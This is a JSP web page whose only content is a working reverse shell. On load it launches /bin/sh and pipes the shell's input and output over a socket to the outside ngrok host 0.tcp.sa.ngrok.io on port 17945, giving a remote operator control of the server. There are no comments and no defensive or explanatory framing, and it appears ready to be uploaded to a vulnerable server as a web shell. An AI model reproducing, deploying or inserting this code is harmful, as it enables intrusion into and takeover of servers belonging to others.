<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream input;
    OutputStream output;

    StreamConnector( InputStream input, OutputStream output )
    {
      this.input = input;
      this.output = output;
    }

    public void run()
    {
      BufferedReader bufferInput  = null;
      BufferedWriter bufferOutput = null;
      try
      {
        bufferInput  = new BufferedReader( new InputStreamReader( this.input ) );
        bufferOutput = new BufferedWriter( new OutputStreamWriter( this.output ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = bufferInput.read( buffer, 0, buffer.length ) ) > 0 )
        {
          bufferOutput.write( buffer, 0, length );
          bufferOutput.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( bufferInput != null )
          bufferInput.close();
        if( bufferOutput != null )
          bufferOutput.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath = new String("/bin/sh");

    Socket socket = new Socket("0.tcp.sa.ngrok.io", 17945 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>